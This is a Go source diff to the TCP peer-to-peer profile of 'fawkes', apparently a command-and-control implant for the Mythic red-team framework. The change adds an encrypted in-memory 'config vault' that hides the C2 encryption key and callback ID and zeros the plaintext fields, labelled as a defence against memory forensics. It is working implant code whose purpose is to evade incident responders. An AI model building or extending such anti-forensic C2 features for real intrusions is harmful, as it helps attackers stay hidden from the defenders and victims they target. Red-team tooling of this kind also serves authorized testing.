@@ -19,14 +19,28 @@ import (
 	"fawkes/pkg/structs"
 )
 
+// configVault holds AES-256-GCM encrypted C2 configuration for memory forensics defense.
+type configVault struct {
+	key  []byte // AES-256-GCM key (random, generated at SealConfig)
+	blob []byte // Encrypted JSON of sensitiveConfig
+}
+
+// sensitiveConfig holds fields that should not persist as plaintext in memory.
+type sensitiveConfig struct {
+	EncryptionKey string `json:"k"`
+	CallbackUUID  string `json:"c"`
+}
+
 // TCPProfile handles TCP P2P communication with a parent agent or Mythic (via linked egress agent).
 // In P2P mode, this agent does NOT talk to Mythic directly — it sends/receives through a parent agent.
 type TCPProfile struct {
 	BindAddress   string // Address to listen on (e.g., "0.0.0.0:7777") — listener mode
-	EncryptionKey string // Base64-encoded AES key (same as HTTP profile)
+	EncryptionKey string // Base64-encoded AES key (zeroed after SealConfig)
 	Debug         bool
 
-	CallbackUUID string // Set after checkin
+	CallbackUUID string // Set after checkin (zeroed after SealConfig)
+
+	vault *configVault // Encrypted config vault (set by SealConfig)
 
 	// Parent connection (this agent connects to parent, or parent connects to us)
 	parentConn net.Conn
@@ -120,7 +134,7 @@ func (t *TCPProfile) Checkin(agent *structs.Agent) error {
 	}
 
 	// Encrypt if key provided
-	if t.EncryptionKey != "" {
+	if t.getEncryptionKey() != "" {
 		body, err = t.encryptMessage(body)
 		if err != nil {
 			return fmt.Errorf("encryption failed: %w", err)
@@ -147,7 +161,7 @@ func (t *TCPProfile) Checkin(agent *structs.Agent) error {
 
 	// Decrypt response
 	var decryptedResponse []byte
-	if t.EncryptionKey != "" {
+	if t.getEncryptionKey() != "" {
 		decodedData, err := base64.StdEncoding.DecodeString(string(respData))
 		if err != nil {
 			return fmt.Errorf("failed to decode checkin response: %w", err)
@@ -168,17 +182,17 @@ func (t *TCPProfile) Checkin(agent *structs.Agent) error {
 
 	if callbackID, exists := checkinResponse["id"]; exists {
 		if callbackStr, ok := callbackID.(string); ok {
-			t.CallbackUUID = callbackStr
-			log.Printf("session: %s", t.CallbackUUID)
+			t.UpdateCallbackUUID(callbackStr)
+			log.Printf("session: %s", callbackStr)
 		}
 	} else if callbackUUID, exists := checkinResponse["uuid"]; exists {
 		if callbackStr, ok := callbackUUID.(string); ok {
-			t.CallbackUUID = callbackStr
-			log.Printf("session: %s", t.CallbackUUID)
+			t.UpdateCallbackUUID(callbackStr)
+			log.Printf("session: %s", callbackStr)
 		}
 	} else {
 		log.Printf("no session id, using default")
-		t.CallbackUUID = agent.PayloadUUID
+		t.UpdateCallbackUUID(agent.PayloadUUID)
 	}
 
 	// Continue accepting connections in the background for additional child links
@@ -226,7 +240,7 @@ done:
 		return nil, nil, fmt.Errorf("failed to marshal tasking: %w", err)
 	}
 
-	if t.EncryptionKey != "" {
+	if t.getEncryptionKey() != "" {
 		body, err = t.encryptMessage(body)
 		if err != nil {
 			return nil, nil, fmt.Errorf("encryption failed: %w", err)
@@ -249,7 +263,7 @@ done:
 	}
 
 	var decryptedData []byte
-	if t.EncryptionKey != "" {
+	if t.getEncryptionKey() != "" {
 		decodedData, err := base64.StdEncoding.DecodeString(string(respData))
 		if err != nil {
 			return nil, nil, fmt.Errorf("failed to decode response: %w", err)
@@ -351,7 +365,7 @@ doneEdges:
 		return nil, fmt.Errorf("failed to marshal response: %w", err)
 	}
 
-	if t.EncryptionKey != "" {
+	if t.getEncryptionKey() != "" {
 		body, err = t.encryptMessage(body)
 		if err != nil {
 			return nil, fmt.Errorf("encryption failed: %w", err)
@@ -374,7 +388,7 @@ doneEdges:
 	}
 
 	var decryptedData []byte
-	if t.EncryptionKey != "" {
+	if t.getEncryptionKey() != "" {
 		decodedData, err := base64.StdEncoding.DecodeString(string(respData))
 		if err != nil {
 			return nil, fmt.Errorf("failed to decode PostResponse reply: %w", err)
@@ -581,7 +595,7 @@ func (t *TCPProfile) handleRelink(conn net.Conn) {
 	}
 
 	// Process response — update callback UUID if provided
-	if t.EncryptionKey != "" {
+	if t.getEncryptionKey() != "" {
 		decodedData, err := base64.StdEncoding.DecodeString(string(respData))
 		if err == nil {
 			decryptedResponse, err := t.decryptResponse(decodedData)
@@ -590,7 +604,7 @@ func (t *TCPProfile) handleRelink(conn net.Conn) {
 				if err := json.Unmarshal(decryptedResponse, &checkinResponse); err == nil {
 					if callbackID, exists := checkinResponse["id"]; exists {
 						if callbackStr, ok := callbackID.(string); ok {
-							t.CallbackUUID = callbackStr
+							t.UpdateCallbackUUID(callbackStr)
 						}
 					}
 				}
@@ -669,7 +683,7 @@ func (t *TCPProfile) readFromChild(uuid string, conn net.Conn) {
 			t.RemoveChildConnection(t.resolveUUID(uuid))
 			// Send edge removal
 			t.EdgeMessages <- structs.P2PConnectionMessage{
-				Source:        t.CallbackUUID,
+				Source:        t.GetCallbackUUID(),
 				Destination:   t.resolveUUID(uuid),
 				Action:        "remove",
 				C2ProfileName: "tcp",
@@ -742,12 +756,112 @@ func (t *TCPProfile) resolveUUID(uuid string) string {
 
 // GetCallbackUUID returns the callback UUID assigned by Mythic after checkin.
 func (t *TCPProfile) GetCallbackUUID() string {
+	if t.vault != nil {
+		cfg := t.getConfig()
+		if cfg != nil {
+			return cfg.CallbackUUID
+		}
+		return ""
+	}
 	return t.CallbackUUID
 }
 
+// SealConfig encrypts EncryptionKey and CallbackUUID into an AES-256-GCM vault
+// and zeros the plaintext struct fields.
+func (t *TCPProfile) SealConfig() error {
+	key := make([]byte, 32)
+	if _, err := rand.Read(key); err != nil {
+		return fmt.Errorf("config vault key generation failed: %w", err)
+	}
+
+	cfg := &sensitiveConfig{
+		EncryptionKey: t.EncryptionKey,
+		CallbackUUID:  t.CallbackUUID,
+	}
+
+	plaintext, err := json.Marshal(cfg)
+	if err != nil {
+		vaultZeroBytes(key)
+		return fmt.Errorf("config vault marshal failed: %w", err)
+	}
+
+	blob := vaultEncrypt(key, plaintext)
+	vaultZeroBytes(plaintext)
+	if blob == nil {
+		vaultZeroBytes(key)
+		return fmt.Errorf("config vault encryption failed")
+	}
+
+	t.vault = &configVault{key: key, blob: blob}
+
+	// Zero plaintext struct fields
+	t.EncryptionKey = ""
+	t.CallbackUUID = ""
+
+	return nil
+}
+
+// getConfig returns the current config from the vault or plaintext fields.
+func (t *TCPProfile) getConfig() *sensitiveConfig {
+	if t.vault == nil {
+		return &sensitiveConfig{
+			EncryptionKey: t.EncryptionKey,
+			CallbackUUID:  t.CallbackUUID,
+		}
+	}
+
+	plaintext := vaultDecrypt(t.vault.key, t.vault.blob)
+	if plaintext == nil {
+		return nil
+	}
+
+	var cfg sensitiveConfig
+	if err := json.Unmarshal(plaintext, &cfg); err != nil {
+		vaultZeroBytes(plaintext)
+		return nil
+	}
+	vaultZeroBytes(plaintext)
+	return &cfg
+}
+
+// UpdateCallbackUUID updates the callback UUID in the vault or struct field.
+func (t *TCPProfile) UpdateCallbackUUID(uuid string) {
+	if t.vault == nil {
+		t.CallbackUUID = uuid
+		return
+	}
+	cfg := t.getConfig()
+	if cfg == nil {
+		return
+	}
+	cfg.CallbackUUID = uuid
+	plaintext, err := json.Marshal(cfg)
+	if err != nil {
+		return
+	}
+	blob := vaultEncrypt(t.vault.key, plaintext)
+	vaultZeroBytes(plaintext)
+	if blob != nil {
+		t.vault.blob = blob
+	}
+}
+
+// getEncryptionKey returns the encryption key from the vault or struct field.
+func (t *TCPProfile) getEncryptionKey() string {
+	if t.vault != nil {
+		cfg := t.getConfig()
+		if cfg != nil {
+			return cfg.EncryptionKey
+		}
+		return ""
+	}
+	return t.EncryptionKey
+}
+
 func (t *TCPProfile) getActiveUUID(agent *structs.Agent) string {
-	if t.CallbackUUID != "" {
-		return t.CallbackUUID
+	uuid := t.GetCallbackUUID()
+	if uuid != "" {
+		return uuid
 	}
 	return agent.PayloadUUID
 }
@@ -797,11 +911,12 @@ func (t *TCPProfile) recvTCP(conn net.Conn) ([]byte, error) {
 // encryptMessage encrypts a message using AES-CBC with HMAC (Freyja format).
 // Returns an error if encryption fails — never falls back to plaintext to avoid leaking unencrypted data.
 func (t *TCPProfile) encryptMessage(msg []byte) ([]byte, error) {
-	if t.EncryptionKey == "" {
+	encKey := t.getEncryptionKey()
+	if encKey == "" {
 		return msg, nil
 	}
 
-	key, err := base64.StdEncoding.DecodeString(t.EncryptionKey)
+	key, err := base64.StdEncoding.DecodeString(encKey)
 	if err != nil {
 		return nil, fmt.Errorf("failed to decode encryption key: %w", err)
 	}
@@ -831,11 +946,12 @@ func (t *TCPProfile) encryptMessage(msg []byte) ([]byte, error) {
 }
 
 func (t *TCPProfile) decryptResponse(encryptedData []byte) ([]byte, error) {
-	if t.EncryptionKey == "" {
+	encKey := t.getEncryptionKey()
+	if encKey == "" {
 		return encryptedData, nil
 	}
 
-	key, err := base64.StdEncoding.DecodeString(t.EncryptionKey)
+	key, err := base64.StdEncoding.DecodeString(encKey)
 	if err != nil {
 		return nil, fmt.Errorf("failed to decode encryption key: %w", err)
 	}
@@ -907,4 +1023,49 @@ func getString(m map[string]interface{}, key string) string {
 		}
 	}
 	return ""
+}
+
+// --- Vault encryption helpers (AES-256-GCM) ---
+
+func vaultEncrypt(key, plaintext []byte) []byte {
+	block, err := aes.NewCipher(key)
+	if err != nil {
+		return nil
+	}
+	gcm, err := cipher.NewGCM(block)
+	if err != nil {
+		return nil
+	}
+	nonce := make([]byte, gcm.NonceSize())
+	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
+		return nil
+	}
+	return gcm.Seal(nonce, nonce, plaintext, nil)
+}
+
+func vaultDecrypt(key, blob []byte) []byte {
+	block, err := aes.NewCipher(key)
+	if err != nil {
+		return nil
+	}
+	gcm, err := cipher.NewGCM(block)
+	if err != nil {
+		return nil
+	}
+	nonceSize := gcm.NonceSize()
+	if len(blob) < nonceSize {
+		return nil
+	}
+	nonce, ciphertext := blob[:nonceSize], blob[nonceSize:]
+	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
+	if err != nil {
+		return nil
+	}
+	return plaintext
+}
+
+func vaultZeroBytes(b []byte) {
+	for i := range b {
+		b[i] = 0
+	}
 }
